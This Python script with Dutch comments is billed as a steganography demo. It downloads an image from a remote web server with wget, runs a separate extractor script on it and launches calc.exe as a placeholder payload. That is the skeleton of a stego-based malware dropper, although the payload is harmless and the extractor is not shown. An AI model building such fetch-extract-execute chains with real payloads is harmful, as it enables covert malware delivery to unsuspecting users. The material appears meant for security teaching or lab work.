import os
import sys
import subprocess
from pathlib import Path

# === SETTINGS ===
# Zet hier de URL van je output.png op je webserver
IMAGE_URL = "http://192.168.123.92:8000/output.png"

# Bestandsnaam waarmee de afbeelding wordt opgeslagen
IMAGE_NAME = "output.png"

# Pad naar je extractor script
EXTRACTOR_SCRIPT = "extractor.py"


def get_downloads_folder():
    """Geeft de Downloads-map terug van de huidige gebruiker."""
    return Path.home() / "Downloads"


def download_image(image_url, download_path):
    """Downloadt de afbeelding met wget naar de Downloads-map."""
    print("[1] Afbeelding downloaden...")

    try:
        subprocess.run(
            ["wget", "-O", str(download_path), image_url],
            check=True
        )
        print(f"[OK] Afbeelding opgeslagen als: {download_path}")
    except FileNotFoundError:
        print("[FOUT] wget is niet gevonden. Installeer wget of gebruik curl.")
        sys.exit(1)
    except subprocess.CalledProcessError:
        print("[FOUT] Downloaden is mislukt. Check de URL of webserver.")
        sys.exit(1)


def run_extractor(image_path):
    """Voert extractor.py uit op de gedownloade afbeelding."""
    print("[2] Extractor script uitvoeren...")

    script_path = Path(__file__).parent / EXTRACTOR_SCRIPT

    if not script_path.exists():
        print(f"[FOUT] Extractor script niet gevonden: {script_path}")
        sys.exit(1)

    try:
        subprocess.run(
            [sys.executable, str(script_path), str(image_path)],
            check=True
        )
        print("[OK] Extractor script is uitgevoerd.")
    except subprocess.CalledProcessError:
        print("[FOUT] Extractor script gaf een fout.")
        sys.exit(1)


def run_safe_test_payload():
    """Opent alleen calc.exe als veilige testpayload."""
    print("[3] Veilige testpayload uitvoeren: calc.exe")

    try:
        subprocess.Popen(["calc.exe"])
        print("[OK] calc.exe is geopend.")
    except FileNotFoundError:
        print("[FOUT] calc.exe werkt alleen op Windows.")
    except Exception as error:
        print(f"[FOUT] Payload kon niet uitgevoerd worden: {error}")


def main():
    downloads_folder = get_downloads_folder()
    image_path = downloads_folder / IMAGE_NAME

    print("=== All-in-one steganography demo ===")

    download_image(IMAGE_URL, image_path)
    run_extractor(image_path)
    run_safe_test_payload()

    print("=== Demo klaar ===")


if __name__ == "__main__":
    main()